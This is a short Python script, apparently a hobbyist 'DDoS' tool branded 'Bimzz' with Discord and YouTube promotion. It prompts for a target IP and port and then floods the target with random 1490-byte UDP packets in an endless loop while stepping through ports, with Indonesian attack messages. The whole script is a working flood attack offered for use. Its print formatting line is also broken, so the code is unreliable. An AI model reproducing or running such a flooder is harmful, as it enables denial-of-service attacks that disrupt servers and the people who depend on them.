import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Bimzz DDoS")
print("""\u001b[31m
>>> YOUTUBE : Bimzz
>>>>> Discord : KyBimzZ  び#1716
>>>>>>>>> KyTeam : https://discord.gg/YMT9utYW5U""")

ip = str(input("IP TARGET : "))
port = int(input("PORT TARGET :"))

os.system("clear")
os.system("figlet Memulai Serangan!")
print("Memulai Pengiriman Semua Packets Ke Server!")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("[Bimzz] | Mengirim %s Pakets Ke IP : %s | PORT :%")(sent,ip,port)
     if port == 65534:
       port = 1